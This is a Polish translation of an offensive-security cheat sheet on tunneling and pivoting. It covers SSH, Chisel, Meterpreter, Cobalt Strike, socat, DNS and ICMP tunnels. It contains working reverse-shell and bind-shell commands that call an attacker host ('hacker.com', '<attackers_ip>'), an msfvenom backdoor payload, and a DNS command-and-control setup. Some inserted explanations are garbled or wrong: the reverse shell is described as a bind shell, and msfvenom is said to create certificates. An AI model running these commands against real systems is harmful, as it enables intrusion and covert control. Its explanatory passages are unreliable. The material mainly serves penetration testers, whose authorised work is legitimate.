# Tunelowanie i przekierowanie portów

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Wskazówka dotycząca Nmap

{% hint style="warning" %}
Skanowanie **ICMP** i **SYN** nie może być tunelowane przez proxy socks, dlatego musimy **wyłączyć odkrywanie pingów** (`-Pn`) i określić **skanowanie TCP** (`-sT`), aby to działało.
{% endhint %}

## **Bash**

**Host -> Skok -> WewnętrznyA -> WewnętrznyB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Połączenie graficzne SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Lokalne przekierowanie portów

Otwórz nowy port na serwerze SSH --> Inny port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Port lokalny --> Skompromitowany host (SSH) --> Trzecia\_skrzynka:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Lokalny Port --> Skompromitowany host (SSH) --> Gdziekolwiek
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Odwrócone przekierowanie portów

Jest to przydatne do uzyskiwania odwróconych powłok z wewnętrznych hostów przez strefę zdemilitaryzowaną (DMZ) do Twojego hosta:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### Tunel VPN

Potrzebujesz **uprawnień root na obu urządzeniach** (ponieważ będziesz tworzyć nowe interfejsy) oraz konfiguracja sshd musi zezwalać na logowanie jako root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
## Włączanie przekierowania po stronie serwera

Aby umożliwić przekierowanie po stronie serwera, wykonaj następujące kroki:

1. Zaloguj się na serwerze, na którym chcesz włączyć przekierowanie.
2. Otwórz plik konfiguracyjny systemu operacyjnego odpowiedni dla Twojego serwera. Na przykład, jeśli korzystasz z systemu Linux, otwórz plik `/etc/sysctl.conf`.
3. Znajdź linijkę zawierającą parametr `net.ipv4.ip_forward` i ustaw go na wartość `1`. Jeśli nie ma takiej linii, dodaj ją na końcu pliku.
4. Zapisz plik konfiguracyjny i zamknij go.
5. Uruchom polecenie `sysctl -p`, aby załadować nową konfigurację.
6. Przekierowanie po stronie serwera zostało teraz włączone.

Pamiętaj, że włączenie przekierowania po stronie serwera może mieć wpływ na bezpieczeństwo sieci. Upewnij się, że masz odpowiednie zabezpieczenia, takie jak zapory ogniowe, aby chronić swoje systemy przed nieautoryzowanym dostępem.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Ustaw nową trasę po stronie klienta
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Możesz **przekierować** cały **ruch** do **podsieci** za pośrednictwem hosta przy użyciu **ssh**.\
Na przykład, przekierowując cały ruch do 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Połącz się za pomocą klucza prywatnego
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Port lokalny --> Skompromitowany host (aktywna sesja) --> Trzecia\_skrzynka:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
SOCKS (Socket Secure) jest protokołem internetowym, który umożliwia przekierowanie ruchu sieciowego między klientem a serwerem. Działa na poziomie aplikacji i może być używany do tunelowania różnych protokołów, takich jak HTTP, FTP i SMTP. SOCKS umożliwia klientowi uzyskanie dostępu do zasobów sieciowych za pośrednictwem serwera SOCKS, który działa jako pośrednik między klientem a docelowym serwerem. Może być również używany do omijania blokad sieciowych i ukrywania prawdziwego adresu IP klienta.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Inny sposób:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### Proxy SOCKS

Otwórz port w teamserverze nasłuchującym na wszystkich interfejsach, które mogą być użyte do **przekierowania ruchu przez beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
W tym przypadku **port jest otwarty na hoście beacon**, a nie na serwerze zespołu, a ruch jest wysyłany do serwera zespołu, a stamtąd do wskazanego hosta:portu.
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Do zanotowania:

- Odwrócone przekierowanie portu Beacona jest zaprojektowane do **tunelowania ruchu do Serwera Zespołu, a nie do przekazywania między poszczególnymi maszynami**.
- Ruch jest **tunelowany w ramach ruchu C2 Beacona**, włącznie z linkami P2P.
- **Nie są wymagane uprawnienia administratora** do tworzenia odwróconych przekierowań portów na wysokich portach.

### rPort2Port lokalnie

{% hint style="warning" %}
W tym przypadku **port jest otwarty na hoście Beacona**, a nie na Serwerze Zespołu, a **ruch jest wysyłany do klienta Cobalt Strike** (nie do Serwera Zespołu) i stamtąd do wskazanego hosta:portu.
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Musisz przesłać tunel plików internetowych: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Możesz go pobrać ze strony wydań [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Musisz używać **tej samej wersji dla klienta i serwera**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Przekierowywanie portów

Port forwarding (przekierowywanie portów) jest techniką, która umożliwia przekierowanie ruchu sieciowego z jednego portu na innym urządzeniu. Jest to przydatne narzędzie w celu umożliwienia dostępu do usług sieciowych znajdujących się za zapory ogniowej lub routerem.

#### Local Port Forwarding (Przekierowywanie portów lokalnych)

Przekierowywanie portów lokalnych umożliwia przekierowanie ruchu sieciowego z lokalnego portu na zdalny port na innym urządzeniu. Jest to przydatne, gdy chcemy uzyskać dostęp do usług sieciowych na zdalnym serwerze, który jest niedostępny bezpośrednio z naszego lokalnego komputera.

Aby skonfigurować przekierowywanie portów lokalnych, możemy użyć narzędzi takich jak SSH lub PuTTY. Poniżej przedstawiono przykład użycia SSH do przekierowania portu lokalnego:

```bash
ssh -L <local_port>:<remote_host>:<remote_port> <username>@<ssh_server>
```

#### Remote Port Forwarding (Przekierowywanie portów zdalnych)

Przekierowywanie portów zdalnych umożliwia przekierowanie ruchu sieciowego z zdalnego portu na lokalny port na naszym komputerze. Jest to przydatne, gdy chcemy udostępnić usługi sieciowe znajdujące się na naszym komputerze innym użytkownikom w sieci.

Aby skonfigurować przekierowywanie portów zdalnych, możemy użyć narzędzi takich jak SSH lub PuTTY. Poniżej przedstawiono przykład użycia SSH do przekierowania portu zdalnego:

```bash
ssh -R <remote_port>:<local_host>:<local_port> <username>@<ssh_server>
```

#### Dynamic Port Forwarding (Przekierowywanie portów dynamicznych)

Przekierowywanie portów dynamicznych umożliwia przekierowanie ruchu sieciowego z lokalnego portu na zdalne usługi sieciowe. Jest to przydatne, gdy chcemy przekierować cały ruch sieciowy z naszego komputera przez zdalny serwer, aby uzyskać anonimowy dostęp do Internetu.

Aby skonfigurować przekierowywanie portów dynamicznych, możemy użyć narzędzi takich jak SSH lub PuTTY. Poniżej przedstawiono przykład użycia SSH do przekierowania portów dynamicznych:

```bash
ssh -D <local_port> <username>@<ssh_server>
```

#### Przykłady zastosowania przekierowywania portów

- Udostępnianie lokalnego serwera WWW na zdalnym komputerze.
- Uzyskiwanie dostępu do zdalnych usług sieciowych, które są niedostępne publicznie.
- Przekierowywanie ruchu sieciowego przez tunel SSH w celu zwiększenia bezpieczeństwa.
- Uzyskiwanie anonimowego dostępu do Internetu przez przekierowywanie portów dynamicznych.

Przekierowywanie portów jest potężnym narzędziem, które może być wykorzystane w różnych scenariuszach. Ważne jest, aby zrozumieć, jak skonfigurować i używać tej techniki w sposób bezpieczny i odpowiedzialny.
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Odwrócony tunel. Tunel jest uruchamiany z ofiary.\
Tworzony jest proxy socks4 na 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Przejdź przez **proxy NTLM**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Powiązane gniazdo
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Odwrócony shell

Reverse shell (odwrócony shell) to technika, która umożliwia zdalne połączenie z komputerem lub serwerem, który jest chroniony przez zaporę ogniową lub innymi mechanizmami bezpieczeństwa. W przypadku odwróconego shella, atakujący tworzy połączenie z celowym systemem, który działa jako serwer, a następnie zdalnie kontroluje ten system, korzystając z powłoki systemowej.

Aby osiągnąć odwrócony shell, atakujący musi najpierw umieścić na celu złośliwy kod, który będzie nasłuchiwał na określonym porcie. Następnie atakujący musi uruchomić program klienta na swoim własnym systemie, który połączy się z serwerem nasłuchującym na celu. Po nawiązaniu połączenia, atakujący może wykonywać polecenia na zdalnym systemie, tak jakby był fizycznie obecny na tym systemie.

Odwrócony shell jest często wykorzystywany przez hakerów podczas testów penetracyjnych, aby zdobyć zdalny dostęp do systemów i przeprowadzić dalsze ataki. Jest to również przydatne narzędzie dla administratorów systemów, którzy chcą zdalnie zarządzać swoimi systemami w celu diagnostyki i konserwacji.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port

Port2Port is a technique used to establish a direct connection between two network ports. It allows traffic to be forwarded from one port to another, enabling communication between different devices or networks.

To set up a Port2Port connection, you need to configure port forwarding on both the source and destination devices. This involves specifying the source port, destination IP address, and destination port.

Port2Port can be useful in various scenarios, such as accessing a service running on a remote machine, bypassing firewalls or NAT restrictions, or creating a secure tunnel for data transmission.

There are several tools and methods available for implementing Port2Port, including SSH tunneling, reverse SSH tunneling, VPNs, and proxy servers. Each method has its own advantages and use cases.

When using Port2Port, it is important to consider security implications and ensure that proper authentication and encryption measures are in place to protect the transmitted data.

Overall, Port2Port is a versatile technique that can be leveraged for various purposes, providing a convenient way to establish direct connections between network ports.
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port przez socks

Port forwarding is a technique used to redirect network traffic from one port on a host to another port on a different host. This can be useful in various scenarios, such as accessing a service running on a remote machine or bypassing network restrictions.

One way to achieve port forwarding is through the use of a SOCKS proxy. SOCKS (Socket Secure) is a protocol that allows for the creation of a secure connection between a client and a server. By configuring a SOCKS proxy, you can establish a tunnel between two hosts and forward traffic between specific ports.

To perform port forwarding through a SOCKS proxy, you can use tools like `socat` or `ssh`. Here's an example using `socat`:

```bash
socat TCP-LISTEN:8080,fork SOCKS4A:proxy.example.com:target.example.com:80,socksport=1080
```

In this example, `socat` listens on port 8080 and forwards incoming TCP traffic to port 80 on the target host (`target.example.com`) through a SOCKS proxy (`proxy.example.com`). The `socksport` parameter specifies the port on which the SOCKS proxy is running (in this case, port 1080).

Similarly, you can achieve port forwarding through a SOCKS proxy using `ssh`:

```bash
ssh -L 8080:target.example.com:80 -D proxy.example.com
```

In this example, `ssh` establishes a dynamic port forwarding tunnel (`-D`) through the SOCKS proxy (`proxy.example.com`). It also forwards traffic from port 8080 on the local machine to port 80 on the target host (`target.example.com`).

By using these techniques, you can easily set up port forwarding through a SOCKS proxy and redirect traffic between different hosts and ports. This can be particularly useful in situations where direct access to a specific port is restricted or unavailable.
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter przez SSL Socat

W przypadku, gdy próbujesz uzyskać dostęp do systemu za pomocą Meterpretera, ale napotykasz na problemy z filtrowaniem ruchu sieciowego, możesz skorzystać z techniki tunelowania SSL Socat. Ta metoda pozwala na przekierowanie ruchu przez porty SSL, co umożliwia uniknięcie wykrycia i blokowania.

Aby skorzystać z tej techniki, wykonaj następujące kroki:

1. Uruchom Meterpreter na swoim celu.
2. Wygeneruj certyfikat SSL za pomocą narzędzia `msfvenom`:
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<attacker IP> LPORT=<attacker port> -f exe > meterpreter.exe
```
3. Uruchom serwer SSL Socat na swoim atakującym systemie:
```
socat OPENSSL-LISTEN:<attacker port>,cert=<path to certificate>,key=<path to key> -
```
4. Przekieruj ruch SSL z Meterpretera do serwera SSL Socat, wykonując następujące polecenie w Meterpreterze:
```
portfwd add -l <local port> -p <remote port> -r <attacker IP>
```
5. Teraz, gdy próbujesz uzyskać dostęp do systemu za pomocą Meterpretera, ruch zostanie przekierowany przez porty SSL Socat, co pozwoli na uniknięcie wykrycia i blokowania.

Pamiętaj, że ta technika może być nielegalna, jeśli nie masz uprawnienia do testowania penetracyjnego na danym systemie. Zawsze działaj zgodnie z prawem i uzyskaj odpowiednie zezwolenia przed przeprowadzeniem testów penetracyjnych.
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Możesz ominąć **nieuwierzytelniony proxy** wykonując ten wiersz zamiast ostatniego w konsoli ofiary:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/odwrotna-furtka-ssl-z-socat-i-metasploit/](https://funoverip.net/2011/01/odwrotna-furtka-ssl-z-socat-i-metasploit/)

### Tunel SSL Socat

**/bin/sh konsola**

Utwórz certyfikaty po obu stronach: Klienta i Serwera
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Zdalne przekierowanie portu do portu

Połącz lokalny port SSH (22) z portem 443 hosta atakującego
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

To jest wersja konsolowa programu PuTTY (opcje są bardzo podobne do klienta ssh).

Ponieważ ten plik wykonywalny będzie uruchamiany na ofierze i jest to klient ssh, musimy otworzyć naszą usługę ssh i port, aby móc nawiązać odwrotne połączenie. Następnie, aby przekierować tylko lokalnie dostępny port na port na naszej maszynie:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Musisz być lokalnym administratorem (dla dowolnego portu)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Musisz mieć **dostęp RDP do systemu**.\
Pobierz:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Narzędzie to wykorzystuje `Dynamic Virtual Channels` (`DVC`) z funkcji usługi Remote Desktop Service w systemie Windows. DVC jest odpowiedzialne za **tunelowanie pakietów przez połączenie RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Na komputerze klienta załaduj **`SocksOverRDP-Plugin.dll`** w ten sposób:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Teraz możemy **połączyć** się z **ofiarą** za pomocą **RDP** przy użyciu **`mstsc.exe`**, i powinniśmy otrzymać **komunikat**, że wtyczka **SocksOverRDP jest włączona**, a będzie **nasłuchiwać** na **127.0.0.1:1080**.

**Połącz** się za pomocą **RDP** i przesłań oraz uruchom na maszynie ofiary plik binarny `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Teraz potwierdź na swojej maszynie (atakującej), czy port 1080 nasłuchuje:
```
netstat -antb | findstr 1080
```
Teraz możesz użyć [**Proxifier**](https://www.proxifier.com/), **aby przekierować ruch przez ten port.**

## Proxify aplikacje GUI w systemie Windows

Możesz skonfigurować aplikacje GUI w systemie Windows do korzystania z proxy za pomocą [**Proxifier**](https://www.proxifier.com/).\
W **Profil -> Serwery proxy** dodaj IP i port serwera SOCKS.\
W **Profil -> Reguły proxification** dodaj nazwę programu, który ma być proxified oraz połączenia do adresów IP, które chcesz proxify.

## Bypass proxy NTLM

Wcześniej wspomniane narzędzie: **Rpivot**\
**OpenVPN** może również go ominąć, ustawiając te opcje w pliku konfiguracyjnym:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Autentykuje się wobec serwera proxy i przekierowuje lokalny port na zewnętrzną usługę, którą określisz. Następnie możesz używać narzędzia swojego wyboru przez ten port.\
Na przykład przekierowuje port 443.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Teraz, jeśli na przykład ustawisz usługę **SSH** na ofierze, aby nasłuchiwała na porcie 443. Możesz się do niej podłączyć za pomocą portu 2222 atakującego.\
Możesz również użyć **meterpretera**, który łączy się z localhost:443, a atakujący nasłuchuje na porcie 2222.

## YARP

Odwrócony proxy stworzony przez Microsoft. Możesz go znaleźć tutaj: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## Tunelowanie DNS

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

W obu systemach wymagane jest posiadanie uprawnień roota do utworzenia adapterów tun i tunelowania danych między nimi za pomocą zapytań DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Tunel będzie bardzo wolny. Możesz utworzyć skompresowane połączenie SSH przez ten tunel, używając:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Pobierz go stąd**](https://github.com/iagox86/dnscat2)**.**

Ustanawia kanał C\&C za pomocą DNS. Nie wymaga uprawnień roota.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **W PowerShellu**

Możesz użyć [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell), aby uruchomić klienta dnscat2 w PowerShellu:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Przekierowywanie portów za pomocą dnscat**

Port forwarding is a technique used to redirect network traffic from one port on a host to another port on a different host. It is commonly used in situations where direct communication between two hosts is not possible or desired.

Dnscat is a tool that allows you to create a covert communication channel by using DNS queries and responses. It can be used for various purposes, including port forwarding.

To set up port forwarding with dnscat, follow these steps:

1. Install dnscat on both the client and server machines.

2. Start the dnscat server on the machine that will receive the forwarded traffic. Use the following command:

   ```
   dnscat2 --dns <dns_server_ip>
   ```

   Replace `<dns_server_ip>` with the IP address of the DNS server you want to use.

3. Start the dnscat client on the machine that will send the traffic. Use the following command:

   ```
   dnscat2 --dns <dns_server_ip> --dns-port <dns_server_port>
   ```

   Replace `<dns_server_ip>` with the IP address of the DNS server and `<dns_server_port>` with the port number of the DNS server.

4. On the client machine, set up port forwarding using the following command:

   ```
   dnscat2> portfwd add <local_port> <remote_host> <remote_port>
   ```

   Replace `<local_port>` with the local port number you want to forward, `<remote_host>` with the IP address of the remote host, and `<remote_port>` with the port number on the remote host.

5. Test the port forwarding by connecting to the local port on the client machine. The traffic will be forwarded to the remote host and the response will be sent back through the covert DNS channel.

Port forwarding with dnscat can be a useful technique in situations where traditional port forwarding methods are not available or blocked. However, it is important to note that dnscat may raise suspicion as it involves DNS traffic, which is typically monitored closely.
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Zmiana DNS w proxychains

Proxychains przechwytuje wywołanie `gethostbyname` w bibliotece libc i tuneluje żądanie tcp DNS przez proxy socks. Domyślnie serwer DNS, którego używa proxychains, to 4.2.2.2 (zahardkodowany). Aby go zmienić, edytuj plik: _/usr/lib/proxychains3/proxyresolv_ i zmień adres IP. Jeśli pracujesz w środowisku **Windows**, możesz ustawić adres IP **kontrolera domeny**.

## Tunelowanie w Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## Tunelowanie ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

W obu systemach wymagane jest posiadanie uprawnień roota do utworzenia adapterów tun i tunelowania danych między nimi za pomocą żądań ICMP echo.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Pobierz go stąd**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) to narzędzie umożliwiające wystawienie rozwiązań w Internecie za pomocą jednej linii poleceń.**
*URI wystawienia wyglądają tak:* **UID.ngrok.io**

### Instalacja

- Utwórz konto: https://ngrok.com/signup
- Pobierz klienta:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
#### Tunelowanie TCP

Tunneling TCP allows you to forward TCP traffic from a local port to a remote port through a tunnel. This can be useful in scenarios where you need to access a service running on a remote machine that is not directly accessible from your local network.

To tunnel TCP traffic, you can use tools like `ngrok` or `ssh` with port forwarding.

##### Using ngrok

[Ngrok](https://ngrok.com/) is a popular tool for creating secure tunnels to localhost. It provides a public URL that can be used to access your local service from anywhere.

To tunnel TCP traffic using ngrok, follow these steps:

1. Download and install ngrok from the [official website](https://ngrok.com/download).
2. Start ngrok by running the following command:

   ```
   ngrok tcp <local-port>
   ```

   Replace `<local-port>` with the port number of the service you want to tunnel.

3. Ngrok will generate a public URL that you can use to access your local service. The URL will be displayed in the ngrok console.

   ```
   Forwarding tcp://0.tcp.ngrok.io:<random-port> -> localhost:<local-port>
   ```

   Replace `<random-port>` with the randomly assigned port number.

4. Use the generated URL to access your local service from anywhere.

##### Using ssh with port forwarding

If you have SSH access to a remote machine, you can use SSH port forwarding to tunnel TCP traffic.

To tunnel TCP traffic using SSH, follow these steps:

1. Open a terminal and run the following command:

   ```
   ssh -L <local-port>:<remote-host>:<remote-port> <username>@<remote-host>
   ```

   Replace `<local-port>` with the port number on your local machine that you want to forward, `<remote-host>` with the IP address or hostname of the remote machine, `<remote-port>` with the port number on the remote machine, and `<username>` with your SSH username.

2. Enter your SSH password when prompted.

3. Once the SSH connection is established, you can access the remote service by connecting to `localhost:<local-port>` on your local machine.

   For example, if you forwarded port 8080 on the remote machine to port 8888 on your local machine, you can access the remote service by opening `http://localhost:8080` in your web browser.

#### Tunelowanie TCP

Tunelowanie TCP umożliwia przekierowanie ruchu TCP z lokalnego portu do zdalnego portu przez tunel. Może to być przydatne w sytuacjach, gdy musisz uzyskać dostęp do usługi działającej na zdalnej maszynie, która nie jest bezpośrednio dostępna z twojej lokalnej sieci.

